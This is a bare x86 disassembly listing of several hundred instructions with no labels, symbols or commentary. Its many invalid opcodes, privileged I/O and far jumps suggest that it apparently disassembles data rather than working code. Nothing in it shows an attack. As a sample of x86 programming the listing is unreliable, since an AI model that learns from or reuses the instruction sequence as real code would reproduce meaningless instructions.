  41d8a1:	fld    st(4)
  41d8a3:	and    al,0xfb
  41d8a5:	jmp    0x41d8c6
  41d8a7:	jns    0x41d83d
  41d8a9:	xchg   edx,eax
  41d8aa:	cmp    BYTE PTR [eax],0xfe
  41d8ad:	mov    bh,0xc0
  41d8af:	aad    0x63
  41d8b1:	and    eax,0x6c06f671
  41d8b6:	push   edi
  41d8b7:	clc    
  41d8b8:	mov    BYTE PTR [ebx],al
  41d8ba:	into   
  41d8bb:	(bad)  [ecx+ecx*2+0x58]
  41d8bf:	fs daa 
  41d8c1:	rcl    DWORD PTR [ebp+eiz*1+0xd655bbe],cl
  41d8c8:	ja     0x41d8e0
  41d8ca:	shl    ebx,cl
  41d8cc:	js     0x41d86b
  41d8ce:	mov    ebx,0x386f9fb2
  41d8d3:	jmp    0x4490:0xe805027d
  41d8da:	xchg   edi,eax
  41d8db:	aam    0x68
  41d8dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8de:	xchg   esp,eax
  41d8df:	scas   al,BYTE PTR es:[edi]
  41d8e0:	and    eax,0x8902db8b
  41d8e5:	xchg   ebx,eax
  41d8e6:	and    al,0x90
  41d8e8:	neg    DWORD PTR [edx]
  41d8ea:	stc    
  41d8eb:	inc    edi
  41d8ec:	ins    DWORD PTR es:[edi],dx
  41d8ed:	add    ah,ah
  41d8ef:	sbb    al,0x88
  41d8f1:	xchg   BYTE PTR [edi+esi*1],bl
  41d8f4:	inc    esi
  41d8f5:	xor    al,0x2
  41d8f7:	fbstp  TBYTE PTR [ebp-0x705bb547]
  41d8fd:	and    al,0x1c
  41d8ff:	popa   
  41d900:	hlt    
  41d901:	cmc    
  41d902:	aam    0xce
  41d904:	sub    BYTE PTR [edx],al
  41d906:	jo     0x41d96b
  41d908:	sub    BYTE PTR [ecx],dl
  41d90a:	(bad)  [esi-0x61]
  41d90d:	ja     0x41d92d
  41d90f:	and    DWORD PTR ds:0xb0033567,esi
  41d915:	lahf   
  41d916:	stos   BYTE PTR es:[edi],al
  41d917:	test   al,0x4
  41d919:	gs loopne 0x41d8b4
  41d91c:	add    ecx,DWORD PTR [edi+0x6d]
  41d91f:	scas   eax,DWORD PTR es:[di]
  41d921:	leave  
  41d922:	mov    edx,0xd130281f
  41d927:	sub    al,0x4f
  41d929:	add    cl,dl
  41d92b:	loopne 0x41d8c5
  41d92d:	fld    DWORD PTR [ecx]
  41d92f:	cli    
  41d930:	scas   al,BYTE PTR es:[edi]
  41d931:	rcr    BYTE PTR [edi],1
  41d933:	or     ebp,DWORD PTR [ebx-0x31ac7c52]
  41d939:	outs   dx,BYTE PTR ds:[esi]
  41d93a:	push   edx
  41d93b:	aam    0x9e
  41d93d:	mov    bl,0x41
  41d93f:	out    0xb0,eax
  41d941:	cmp    esi,DWORD PTR [ebx]
  41d943:	jbe    0x41d8cd
  41d945:	push   ebp
  41d946:	mov    eax,0x9c1fe69
  41d94b:	fmul   DWORD PTR [edx]
  41d94d:	add    eax,DWORD PTR [eax-0x76]
  41d950:	cmp    eax,0x8b6f6872
  41d955:	jl     0x41d976
  41d957:	ror    DWORD PTR [ebx+0x49],cl
  41d95a:	leave  
  41d95b:	xor    esp,esi
  41d95d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d95e:	rcl    esp,0xf1
  41d961:	xchg   ebp,eax
  41d962:	mov    ebx,0xa26281ec
  41d967:	or     BYTE PTR [eax+0x2ce947d3],cl
  41d96d:	pop    eax
  41d96e:	sbb    al,0x14
  41d970:	ret    
  41d971:	add    dl,dh
  41d973:	ret    0xb0e9
  41d976:	ja     0x41d996
  41d978:	jae    0x41d9d8
  41d97a:	push   ds
  41d97b:	pop    ebp
  41d97c:	mov    ah,0xd3
  41d97e:	std    
  41d97f:	dec    esi
  41d980:	xchg   edx,eax
  41d981:	popa   
  41d982:	xchg   BYTE PTR [edx+0x146d7d1c],ch
  41d988:	js     0x41d9ac
  41d98a:	xor    esp,ebp
  41d98c:	jp     0x41d992
  41d98e:	pop    ds
  41d98f:	lods   al,BYTE PTR gs:[esi]
  41d991:	test   BYTE PTR [edx+0x2335c9c3],bl
  41d997:	(bad)  
  41d998:	xchg   ebx,eax
  41d999:	add    eax,0xd8e65d20
  41d99e:	test   DWORD PTR [eax+0x611fee7e],edi
  41d9a4:	jo     0x41d988
  41d9a6:	push   eax
  41d9a7:	jge    0x41d9b9
  41d9a9:	mov    ch,0x5e
  41d9ab:	cdq    
  41d9ac:	nop
  41d9ad:	inc    edx
  41d9ae:	dec    esp
  41d9af:	mov    al,0x96
  41d9b1:	cmp    DWORD PTR [esi],esp
  41d9b3:	aam    0x43
  41d9b5:	xor    ebp,DWORD PTR [ebx+0x1fd2d2e6]
  41d9bb:	dec    ebp
  41d9bc:	xor    eax,0xf0cfb7c4
  41d9c1:	cs pop edx
  41d9c3:	aam    0xf2
  41d9c5:	sbb    esp,DWORD PTR [esi+esi*2-0x7027652f]
  41d9cc:	mov    edi,ebx
  41d9ce:	jl     0x41da43
  41d9d0:	ss xchg ecx,eax
  41d9d2:	add    edi,ebx
  41d9d4:	enter  0x21e0,0xd7
  41d9d8:	sub    BYTE PTR [ebp-0x47],ch
  41d9db:	push   es
  41d9dc:	hlt    
  41d9dd:	retf   0xcd5d
  41d9e0:	xchg   ebp,eax
  41d9e1:	(bad)  
  41d9e2:	test   BYTE PTR [ecx-0x36],0x5
  41d9e6:	xor    dl,BYTE PTR ds:0xd7947c00
  41d9ec:	call   0xbb35:0x754a67e
  41d9f3:	hlt    
  41d9f4:	or     ebx,0x1f
  41d9f7:	iret   
  41d9f8:	adc    eax,0x561525a0
  41d9fd:	xchg   ebx,eax
  41d9fe:	(bad)  
  41d9ff:	hlt    
  41da00:	sub    DWORD PTR ds:0x99d83088,ebx
  41da06:	jae    0x41d9f4
  41da08:	jns    0x41da35
  41da0a:	push   ecx
  41da0b:	jbe    0x41da7a
  41da0d:	fwait
  41da0e:	pusha  
  41da0f:	sti    
  41da10:	leave  
  41da11:	retf   
  41da12:	out    dx,al
  41da13:	aam    0x1d
  41da15:	es in  al,0x47
  41da18:	xchg   edx,eax
  41da19:	jge    0x41da90
  41da1b:	and    DWORD PTR [edi+edi*8+0xf31cc1f],ebx
  41da22:	mov    edx,0x65b88b1
  41da27:	sbb    ah,ah
  41da29:	cwde   
  41da2a:	xchg   bh,bh
  41da2c:	pop    ss
  41da2d:	add    ah,al
  41da2f:	and    DWORD PTR [edx],0xa7898910
  41da35:	mov    edi,eax
  41da37:	mov    DWORD PTR [ebp+0x15],esp
  41da3a:	or     cl,BYTE PTR [ecx-0x7cde307c]
  41da40:	adc    al,0xc8
  41da42:	fbstp  TBYTE PTR [ebx+0x3d]
  41da45:	add    bl,BYTE PTR [eax+0x75]
  41da48:	jle    0x41da9a
  41da4a:	clc    
  41da4b:	js     0x41da17
  41da4d:	cmp    bl,BYTE PTR [esi]
  41da4f:	xchg   ebp,eax
  41da50:	sub    dl,ch
  41da52:	std    
  41da53:	mov    edx,0xd72208c2
  41da58:	test   al,0x52
  41da5a:	outs   dx,BYTE PTR ds:[esi]
  41da5b:	dec    edi
  41da5c:	in     al,dx
  41da5d:	jmp    0x31c9e643
  41da62:	jo     0x41da04
  41da64:	sbb    dl,BYTE PTR [esi]
  41da66:	mov    bh,0x69
  41da68:	xor    BYTE PTR [esi+ecx*8-0x5a],bh
  41da6c:	rol    DWORD PTR [eax],0xcf
  41da6f:	dec    esi
  41da70:	stc    
  41da71:	pop    ebx
  41da72:	pop    ds
  41da73:	adc    eax,0xbb802799
  41da78:	lods   al,BYTE PTR ds:[esi]
  41da79:	gs sbb bh,dl
  41da7c:	mov    esi,0x56536959
  41da81:	mov    dh,0x5b
  41da83:	mov    BYTE PTR [eax+0x6b583cb3],cl
  41da89:	cmp    dl,BYTE PTR [eax+0x10]
  41da8c:	sbb    dh,BYTE PTR [ebx+0x2f89deff]
  41da92:	out    dx,al
  41da93:	sub    eax,0xae7f7c38
  41da98:	mov    edi,ecx
  41da9a:	xchg   edi,eax
  41da9b:	ret    
  41da9c:	loopne 0x41dafe
  41da9e:	jbe    0x41da59
  41daa0:	sub    eax,DWORD PTR [ecx]
  41daa2:	push   0xc51c5c9c
  41daa7:	or     bl,dl
  41daa9:	stos   BYTE PTR es:[edi],al
  41daaa:	lods   al,BYTE PTR ds:[esi]
  41daab:	shl    BYTE PTR [ebp+0x8a0fda5],1
  41dab1:	lock mov ah,0x71
  41dab4:	adc    dl,0x70
  41dab7:	in     eax,dx
  41dab8:	sub    al,BYTE PTR [edx]
  41daba:	sub    cl,BYTE PTR [edi-0xf8437ae]
  41dac0:	cld    
  41dac1:	dec    ebx
  41dac2:	sbb    DWORD PTR [edx+esi*8],ebp
  41dac5:	inc    ebp
  41dac6:	dec    edx
  41dac7:	aad    0xf9
  41dac9:	retf   0x1076
  41dacc:	cli    
  41dacd:	(bad)  
  41dace:	stc    
  41dacf:	stos   DWORD PTR es:[edi],eax
  41dad0:	scas   eax,DWORD PTR es:[edi]
  41dad1:	sub    eax,0x42a1f6f5
  41dad6:	mul    DWORD PTR [eax-0x27]
  41dad9:	leave  
  41dada:	pusha  
  41dadb:	adc    eax,0x517c7ba5
  41dae0:	out    0xd1,al
  41dae2:	inc    esp
  41dae3:	aad    0xbb
  41dae5:	sahf   
  41dae6:	retf   0xb996
  41dae9:	daa    
  41daea:	mov    cl,0x32
  41daec:	jne    0x41dac0
  41daee:	pop    ds
  41daef:	int    0x79
  41daf1:	loop   0x41dab0
  41daf3:	cmp    dl,0x46
  41daf6:	loope  0x41dacc
  41daf8:	inc    ecx
  41daf9:	imul   esp,DWORD PTR [edx-0x16],0xf4bbc3b0
  41db00:	mov    DWORD PTR [ebx-0x63],ebp
  41db03:	popa   
  41db04:	push   ebp
  41db05:	mov    eax,ds:0x2dfc7c7
  41db0a:	clc    
  41db0b:	in     eax,0x19
  41db0d:	js     0x41db3f
  41db0f:	loopne 0x41db5d
  41db11:	xchg   edx,eax
  41db12:	push   ss
  41db13:	ss xchg cl,bl
  41db16:	retf   0xf5dc
  41db19:	clc    
  41db1a:	sbb    BYTE PTR [ecx-0x2a951418],0x73
  41db21:	pusha  
  41db22:	popa   
  41db23:	call   0xfd79:0x2df6485e
  41db2a:	pop    ds
  41db2b:	jnp    0x41dac0
  41db2d:	stos   DWORD PTR es:[edi],eax
  41db2e:	sub    DWORD PTR [ebp+0x3c],ecx
  41db31:	es push esp
  41db33:	ror    DWORD PTR [esp+ebp*4+0x40],cl
  41db37:	std    
  41db38:	cmc    
  41db39:	js     0x41db5a
  41db3b:	fidivr WORD PTR [ebx]
  41db3d:	pop    es
  41db3e:	pop    ds
  41db3f:	pop    ebx
  41db40:	mov    ds:0x26f793be,al
  41db45:	inc    ebp
  41db46:	push   ecx
  41db47:	aad    0x23
  41db49:	and    edx,DWORD PTR [edx-0x55dee456]
  41db4f:	xchg   BYTE PTR [edx+0x6a],bh
  41db52:	push   ds
  41db53:	inc    ebp
  41db54:	fidiv  WORD PTR [esi+0x745e8485]
  41db5a:	sub    dl,ah
  41db5c:	xor    BYTE PTR [edx+0x7b],al
  41db5f:	push   edx
  41db60:	inc    edi
  41db61:	je     0x41db62
  41db63:	pop    esi
  41db64:	mov    edi,ecx
  41db66:	test   DWORD PTR [edi],edi
  41db68:	enter  0xa5df,0x19
  41db6c:	xor    al,BYTE PTR [ebx]
  41db6e:	add    BYTE PTR [edi-0x1c],ch
  41db71:	pop    ss
  41db72:	cmp    al,0x8b
  41db74:	fs pop ebx
  41db76:	push   ds
  41db77:	prefetchnta BYTE PTR [eax-0x48fb5ba4]
  41db7e:	mov    edx,esp
  41db80:	aam    0xeb
  41db82:	lods   eax,DWORD PTR ds:[esi]
  41db83:	test   al,0x29
  41db85:	sbb    eax,0xbfa5e875
  41db8a:	mov    edi,0xd943b08c
  41db8f:	push   es
  41db90:	mov    BYTE PTR [edx+0x60],al
  41db93:	mov    edi,0xf34656af
  41db98:	jle    0x41dba0
  41db9a:	xchg   ebx,eax
  41db9b:	icebp  
  41db9c:	std    
  41db9d:	add    al,BYTE PTR [esi+0x57673399]
  41dba3:	test   DWORD PTR [ecx+0x2edd1f35],0x782fce3b
  41dbad:	pop    DWORD PTR [ebp+0x30d50eb8]
  41dbb3:	inc    ebx
  41dbb4:	push   ebp
  41dbb5:	push   es
  41dbb6:	es pop esp
  41dbb8:	popf   
  41dbb9:	pop    ebx
  41dbba:	jle    0x41dbc0
  41dbbc:	dec    edx
  41dbbd:	jb     0x41dbde
  41dbbf:	iret   
  41dbc0:	js     0x41db71
  41dbc2:	stc    
  41dbc3:	in     eax,dx
  41dbc4:	loopne 0x41dc02
  41dbc6:	and    eax,0x8dc354d7
  41dbcb:	pop    ss
  41dbcc:	inc    esi
  41dbcd:	pop    edi
  41dbce:	mov    edi,ebx
  41dbd0:	mov    dh,BYTE PTR [edi]
  41dbd2:	out    dx,al
  41dbd3:	in     eax,0x14
  41dbd5:	sbb    eax,0x521c4e6
  41dbda:	fs pop ebx
  41dbdc:	ins    DWORD PTR es:[edi],dx
  41dbdd:	mov    dh,0x6d
  41dbdf:	into   
  41dbe0:	xchg   esi,eax
  41dbe1:	xor    BYTE PTR [ecx],al
  41dbe3:	pop    ss
  41dbe4:	ja     0x41dc48
  41dbe6:	push   ebx
  41dbe7:	in     eax,dx
  41dbe8:	push   eax
  41dbe9:	pop    ss
  41dbea:	pop    ecx
  41dbeb:	mov    ds:0x34e0b6e2,eax
  41dbf0:	loope  0x41dc47
  41dbf2:	lahf   
  41dbf3:	sti    
  41dbf4:	xchg   ebx,eax
  41dbf5:	add    dh,BYTE PTR [esi+0x29]
  41dbf8:	sub    eax,0x448658ec
  41dbfd:	jmp    0x41dc03
  41dbff:	shl    DWORD PTR [esp+eax*4+0x60],0xdb
  41dc04:	popf   
  41dc05:	pop    ds
  41dc06:	adc    eax,0xe070aada
  41dc0b:	jmp    0xb73de1f
  41dc10:	jge    0x41db9c
  41dc12:	ret    
  41dc13:	sub    edx,ecx
  41dc15:	inc    esi
  41dc16:	jl     0x41dc71
  41dc18:	not    BYTE PTR [ecx+eax*4-0x2c]
  41dc1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc1d:	cdq    
  41dc1e:	clc    
  41dc1f:	popf   
  41dc20:	mov    dh,0x2a
  41dc22:	add    BYTE PTR [edx+0x6b47657b],dh
  41dc28:	mov    es,WORD PTR [edi-0xa0314e0]
  41dc2e:	loope  0x41dc25
  41dc30:	adc    al,0x32
  41dc32:	xchg   ebp,edx
  41dc34:	cwde   
  41dc35:	and    al,BYTE PTR [ebp+0x76]
  41dc38:	xchg   DWORD PTR [edx],ebx
  41dc3a:	std    
  41dc3b:	mov    DWORD PTR [edi-0x54],ebp
  41dc3e:	pusha  
  41dc3f:	sar    DWORD PTR [edx],0xe3
  41dc42:	dec    ebp
  41dc43:	jge    0x41dbfd
  41dc45:	push   0xae8ada4
  41dc4a:	jle    0x41dc13
  41dc4c:	pop    edx
  41dc4d:	add    ecx,edi
  41dc4f:	outs   dx,DWORD PTR ds:[esi]
  41dc50:	sub    DWORD PTR [edi+0x6044051f],0x5d
  41dc57:	test   BYTE PTR [esi-0x62b2ccf],0x4a
  41dc5e:	push   cs
  41dc5f:	sbb    al,0x22
  41dc61:	test   al,0x49
  41dc63:	mov    esi,0xef324588
  41dc68:	mov    bl,0x72
  41dc6a:	cwde   
  41dc6b:	push   0x3839293
  41dc70:	mov    DWORD PTR [edi],esp
  41dc72:	retf   
  41dc73:	cs mov ah,0xde
  41dc76:	and    eax,0x34e388e1
  41dc7b:	xor    BYTE PTR [esp+eax*8+0x4e],ch
  41dc7f:	ret    0x1420
  41dc82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc83:	pop    edi
  41dc84:	out    0xb9,al
  41dc86:	push   ebp
  41dc87:	xor    eax,0x61268363
  41dc8c:	cli    
  41dc8d:	test   eax,0x58ffa9eb
  41dc92:	dec    esp
  41dc93:	push   eax
  41dc94:	mov    ah,0x3c
  41dc96:	in     al,0xaf
  41dc98:	pop    ebp
  41dc99:	add    al,dh
  41dc9b:	scas   eax,DWORD PTR es:[edi]
  41dc9c:	imul   edx,DWORD PTR [ebp-0x32],0xafb78878
  41dca3:	popf   
  41dca4:	data16 jmp 0x41dcc3
  41dca7:	int    0x0
  41dca9:	sbb    cl,BYTE PTR [edx-0x23f2a850]
  41dcaf:	aam    0xaa
  41dcb1:	mov    ah,0x8a
  41dcb3:	pusha  
  41dcb4:	mov    BYTE PTR [ecx+0x41866c3d],bl
  41dcba:	mov    edx,0xe603d841
  41dcbf:	rcr    cl,1
  41dcc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcc2:	leave  
  41dcc3:	mov    ch,0xdf
  41dcc5:	repnz adc al,0x38
  41dcc8:	mov    BYTE PTR ds:0x74a0e087,cl
  41dcce:	mov    dl,0x2d
  41dcd0:	cmp    BYTE PTR ds:0x5746f3f4,bl
  41dcd6:	fsubr  st(6),st
  41dcd8:	fstp   DWORD PTR [edx+0x44]
  41dcdb:	adc    BYTE PTR [ebp-0x75],dh
  41dcde:	pop    ds
  41dcdf:	and    DWORD PTR [ecx+ecx*8+0x5c1efbc9],ecx
  41dce6:	fcomp  QWORD PTR [ecx+0x5703d254]
  41dcec:	mov    cl,0x37
  41dcee:	mov    BYTE PTR [esi+0x1160f428],dh
  41dcf4:	sub    edi,ebp
  41dcf6:	sbb    al,0xbb
  41dcf8:	cmp    ch,bh
  41dcfa:	fst    st(5)
  41dcfc:	pop    ebp
  41dcfd:	mov    edx,DWORD PTR [ebx]
  41dcff:	sbb    edx,DWORD PTR ds:0x8954030d
  41dd05:	and    esp,DWORD PTR [edx-0x5a]
  41dd08:	fld    QWORD PTR [esi+0x2f]
  41dd0b:	sub    ch,BYTE PTR [edx-0x17773400]
  41dd11:	mov    ecx,0xab0dde2e
  41dd16:	dec    edx
  41dd17:	pop    ebp
  41dd18:	mov    ebx,ecx
  41dd1a:	daa    
  41dd1b:	pop    esi
  41dd1c:	int    0x1d
  41dd1e:	sbb    eax,0xb8c97cf
  41dd23:	jp     0x41dcae
  41dd25:	rcl    BYTE PTR [esi-0x8],1
  41dd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd29:	inc    ebp
  41dd2a:	inc    eax
  41dd2b:	inc    ebp
  41dd2c:	repz cmp DWORD PTR [edi-0x61],esi
  41dd30:	mov    cl,0xd1
  41dd32:	lahf   
  41dd33:	dec    edx
  41dd34:	cld    
  41dd35:	and    eax,0x8c180721
  41dd3a:	sbb    eax,DWORD PTR ds:0x735cd189
  41dd40:	mov    DWORD PTR [edx+0x6a],ebp
  41dd43:	inc    ebx
  41dd44:	mov    DWORD PTR [edi+0x7865e7d7],edi
  41dd4a:	xchg   ecx,eax
  41dd4b:	xor    BYTE PTR [eax-0x67aa85e1],dh
  41dd51:	push   ecx
  41dd52:	inc    esi
  41dd53:	add    cl,BYTE PTR [eax-0x64825973]
  41dd59:	pop    sp
  41dd5b:	jo     0x1c285f85
  41dd61:	push   eax
  41dd62:	sahf   
  41dd63:	xchg   ecx,eax
  41dd64:	sub    DWORD PTR [ebp+0x4b],ecx
  41dd67:	loop   0x41dcf0
  41dd69:	adc    DWORD PTR [edi],0x77
  41dd6c:	jne    0x41dda1
  41dd6e:	mov    al,ds:0xe794046c
  41dd73:	add    al,cl
  41dd75:	add    eax,0x326f34ce
  41dd7a:	std    
  41dd7b:	lods   al,BYTE PTR ds:[esi]
  41dd7c:	repz leave 
  41dd7e:	pop    ds
  41dd7f:	dec    ecx
  41dd80:	bound  esp,QWORD PTR [bx+di]
  41dd83:	imul   esp,DWORD PTR [edx+0x2b],0xffffffe4
  41dd87:	aad    0x97
  41dd89:	and    BYTE PTR [edx],ah
  41dd8b:	mov    ds:0xb9edfb7d,eax
  41dd90:	jp     0x41dde0
  41dd92:	dec    edx
  41dd93:	out    dx,eax
  41dd94:	popa   
  41dd95:	outs   dx,DWORD PTR ds:[esi]
  41dd96:	pop    ds
  41dd97:	daa    
  41dd98:	les    ebp,FWORD PTR [edx]
  41dd9a:	mov    ecx,0xb82cbe38
  41dd9f:	outs   dx,DWORD PTR ds:[esi]
  41dda0:	pcmpgtw mm3,QWORD PTR [esi]
  41dda3:	bound  esp,QWORD PTR [eax]
  41dda5:	push   ebp
  41dda6:	and    DWORD PTR ds:0x755dc786,0xffffffee
  41ddad:	bswap  edx
  41ddaf:	imul   ecx,DWORD PTR [ecx+0x6a548953],0x3cba3fac
  41ddb9:	inc    edi
  41ddba:	icebp  
  41ddbb:	sub    DWORD PTR [eax-0x47043ee3],ecx
  41ddc1:	jo     0x41dde1
  41ddc3:	adc    eax,0x5215f2af
  41ddc8:	ss icebp 
  41ddca:	or     eax,0x9e0a28ec
  41ddcf:	aam    0xeb
  41ddd1:	rcr    DWORD PTR [ecx-0x7190d2e0],1
  41ddd7:	or     BYTE PTR [edi+edx*1-0x421c0b87],cl
  41ddde:	and    BYTE PTR [edi+0x4e],dl
  41dde1:	and    ah,BYTE PTR [esi]
  41dde3:	mov    ebp,0xd94144ef
  41dde8:	cmp    DWORD PTR [ebp-0x4f5ec7a],edi
  41ddee:	test   BYTE PTR [esp+eax*4-0x72],dl
  41ddf2:	fidivr WORD PTR [ebx+0x7d5ff413]
  41ddf8:	mov    BYTE PTR [esi+0x3378a4e3],al
  41ddfe:	ins    DWORD PTR es:[edi],dx
  41ddff:	sub    DWORD PTR [esp+edi*8+0x62],edi
  41de03:	mov    ah,0x69
  41de05:	mov    DWORD PTR ds:0x8202d6c5,esi
  41de0b:	pushf  
  41de0c:	jae    0x41de5b
  41de0e:	adc    esi,DWORD PTR [ecx+0x1b]
  41de11:	daa    
  41de12:	pop    ds
  41de13:	popf   
  41de14:	adc    al,0xd4
  41de16:	xor    eax,0xfe712ad0
  41de1b:	aam    0x43
  41de1d:	and    al,0x9e
  41de1f:	ror    DWORD PTR [ebx-0x7753e737],0xed
  41de26:	lods   al,BYTE PTR ds:[esi]
  41de27:	pop    esi
  41de28:	or     BYTE PTR cs:[ecx],ch
  41de2b:	mov    edi,0xa6683c20
  41de30:	retf   
  41de31:	add    eax,0x4d166a2c
  41de36:	aam    0x34
  41de38:	mov    BYTE PTR [ebp-0x76b3803a],dh
  41de3e:	cmc    
  41de3f:	loop   0x41ddd8
  41de41:	add    al,BYTE PTR [edx-0x2a]
  41de44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de45:	pop    ds
  41de46:	aaa    
  41de47:	inc    edx
  41de48:	in     eax,dx
  41de49:	inc    edx
  41de4a:	push   ds
  41de4b:	add    eax,0xab651843
  41de50:	inc    eax
  41de51:	add    esp,ebx
  41de53:	aam    0xdf
  41de55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de56:	imul   esp,DWORD PTR [ebp+0x8d79be3],0x511dad88
  41de60:	mov    eax,ds:0xca6d0d3f
  41de65:	clc    
  41de66:	cmp    esp,edx
  41de68:	mov    ds:0xb60f7ccf,eax
  41de6d:	dec    esi
  41de6e:	cld    
  41de6f:	adc    eax,0x52314b89
  41de74:	sbb    ah,0x14
  41de77:	inc    edi
  41de78:	or     DWORD PTR [edx],eax
  41de7a:	mov    esp,0x30fa02a5
  41de7f:	or     esp,esi
  41de81:	add    esi,DWORD PTR [ebx]
  41de83:	(bad)  
  41de84:	mov    ecx,edi
  41de86:	fnstsw WORD PTR [esi+0x7]
  41de89:	mov    ds:0x59382c11,al
  41de8e:	cmp    BYTE PTR [edi+ebx*4-0x592bc747],bl
  41de95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de96:	adc    BYTE PTR [ecx+0x73f670ed],dh
  41de9c:	popf   
  41de9d:	add    ah,BYTE PTR [edx+0x7478161b]
  41dea3:	inc    edi
  41dea4:	lock add ch,BYTE PTR [eax*2-0x7a4b0786]
  41deac:	push   esp
  41dead:	in     al,0x1f
  41deaf:	neg    ecx
  41deb1:	add    DWORD PTR [ecx],edi
  41deb3:	and    eax,0xd7137cf8
  41deb8:	sbb    bl,BYTE PTR [eax]
  41deba:	adc    BYTE PTR [ecx],cl
  41debc:	sar    BYTE PTR [esi+0x7a78efb7],cl
  41dec2:	sbb    esi,DWORD PTR [ebx-0x2c9e878]
  41dec8:	jge    0x41def6
  41deca:	jecxz  0x41de58
  41decc:	adc    al,BYTE PTR [ebp-0x1677e801]
  41ded2:	and    ebx,DWORD PTR [edi+edi*1]
  41ded5:	dec    esp
  41ded6:	ja     0x41df19
  41ded8:	mov    DWORD PTR [ecx+0x49622a5b],edx
  41dede:	rcr    DWORD PTR [ebx-0x2aa80044],1
  41dee4:	xor    edi,DWORD PTR [esi+ebx*1-0x786575a2]
  41deeb:	and    al,0x94
  41deed:	and    edx,DWORD PTR [ebx+0x1fc636a9]
  41def3:	pusha  
  41def4:	hlt    
  41def5:	cmp    edx,ebx
  41def7:	cwde   
  41def8:	stc    
  41def9:	adc    al,0xfa
  41defb:	mov    edx,0xf101e1ee
  41df00:	in     al,0x29
  41df02:	mov    ds:0x61411a2c,al
  41df07:	mov    ch,0x76
  41df09:	inc    esp
  41df0a:	xchg   esi,eax
  41df0b:	cmp    BYTE PTR [esi],dl
  41df0d:	xchg   ebp,eax
  41df0e:	xlat   BYTE PTR ds:[ebx]
  41df0f:	ret    0x34e
  41df12:	mov    ah,0x36
  41df14:	pop    es
  41df15:	(bad)  
  41df16:	push   cs
  41df17:	int    0xa3
  41df19:	jl     0x41df88
  41df1b:	test   DWORD PTR [esi+0x18],edi
  41df1e:	xor    BYTE PTR [edi+0x77614f27],al
  41df24:	and    BYTE PTR [ebp+0x446cdf38],al
  41df2a:	mov    BYTE PTR [ecx+ecx*8-0x4513f2fb],bl
  41df31:	pusha  
  41df32:	adc    DWORD PTR [esi-0x77],eax
  41df35:	xchg   ebx,eax
  41df36:	popa   
  41df37:	adc    bl,BYTE PTR [ecx-0x9af3d34]
  41df3d:	add    BYTE PTR [eax+0x7c3bd42f],bh
  41df43:	in     eax,0x1f
  41df45:	ret    
  41df46:	fld1   
  41df48:	hlt    
  41df49:	mov    ch,0x41
  41df4b:	aam    0xef
  41df4d:	sbb    eax,0x6f562efa
  41df52:	sbb    al,0xd4
  41df54:	mov    edx,0xa728c314
  41df59:	retf   
  41df5a:	and    edx,ecx
  41df5c:	mov    bl,cl
  41df5e:	push   es
  41df5f:	mov    al,0xb7
  41df61:	lods   al,BYTE PTR ds:[esi]
  41df62:	nop
  41df63:	inc    edx
  41df64:	xlat   BYTE PTR ds:[ebx]
  41df65:	xchg   cl,cl
  41df67:	(bad)  
  41df68:	or     BYTE PTR gs:[ebx],dh
  41df6b:	(bad)  
  41df6d:	add    eax,0x9d63f0ec
  41df72:	jl     0x41df30
  41df74:	test   DWORD PTR [edx],ebp
  41df76:	adc    ah,al
  41df78:	mov    BYTE PTR [ecx+0x12],dh
  41df7b:	das    
  41df7c:	sub    BYTE PTR [ebx-0x4f],dl
  41df7f:	ret    
  41df80:	jle    0x41df82
  41df82:	sub    dl,0x17
  41df85:	adc    edx,DWORD PTR [ebp+0x30eab0c6]
  41df8b:	xor    dh,BYTE PTR [edi+edx*1+0xb158daf]
  41df92:	(bad)  
  41df93:	rol    BYTE PTR [esi],cl
  41df95:	int    0xb
  41df97:	add    al,BYTE PTR [ecx+0x63b26ac2]
  41df9d:	retf   
  41df9e:	jge    0x41e017
  41dfa0:	mov    BYTE PTR [ecx+0x2b],ch
  41dfa3:	mov    ah,0xb8
  41dfa5:	xchg   esi,eax
  41dfa6:	cmc    
  41dfa7:	sahf   
  41dfa8:	xchg   ebp,eax
  41dfa9:	fisttp WORD PTR [eax+ebp*2+0x4d8b035f]
  41dfb0:	mov    esp,0xa0d3b20c
  41dfb5:	sub    al,0xa4
  41dfb7:	imul   ecx,edx,0xffffffad
  41dfba:	jmp    esp
  41dfbc:	add    eax,0x986160d8
  41dfc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfc2:	pop    edx
  41dfc3:	inc    eax
  41dfc4:	xchg   esi,eax
  41dfc5:	sub    edi,ebp
  41dfc7:	loope  0x41dfac
  41dfc9:	adc    al,0xee
  41dfcb:	pop    esi
  41dfcc:	cmp    ecx,ebp
  41dfce:	inc    edx
  41dfcf:	xor    al,0x67
  41dfd1:	mov    bh,0x1b
  41dfd3:	push   ss
  41dfd4:	mov    DWORD PTR [edi-0x25d06332],ebx
  41dfda:	je     0x41dfa7
  41dfdc:	call   0x690dde6
  41dfe1:	cli    
  41dfe2:	dec    esi
  41dfe3:	fcmove st,st(4)
  41dfe5:	xchg   esi,eax
  41dfe6:	pop    ds
  41dfe7:	push   ebp
  41dfe8:	and    dl,ch
  41dfea:	popa   
  41dfeb:	jge    0x41dfc1
  41dfed:	dec    ecx
  41dfee:	add    BYTE PTR [edx+0x32bac9a8],ch
  41dff4:	sbb    eax,0xd9ed499c
  41dff9:	add    al,0x22
  41dffb:	(bad)  [ecx+0x30c8ae1b]
  41e001:	mov    ds:0x3320bd5,eax
  41e006:	mov    al,ds:0xad377e8b
  41e00b:	fstp   DWORD PTR [ebx+0x49571e72]
  41e011:	test   al,0x17
  41e013:	xlat   BYTE PTR ds:[ebx]
  41e014:	push   ebx
  41e015:	sahf   
  41e016:	outs   dx,BYTE PTR ds:[esi]
  41e017:	push   0xd55b0aa2
  41e01c:	adc    al,0x7b
  41e01e:	fisttp QWORD PTR [eax+eax*4]
  41e021:	scas   al,BYTE PTR es:[edi]
  41e022:	outs   dx,BYTE PTR ds:[esi]
  41e023:	mov    ecx,0x3fd9553d
  41e028:	push   0x6ba89e2e
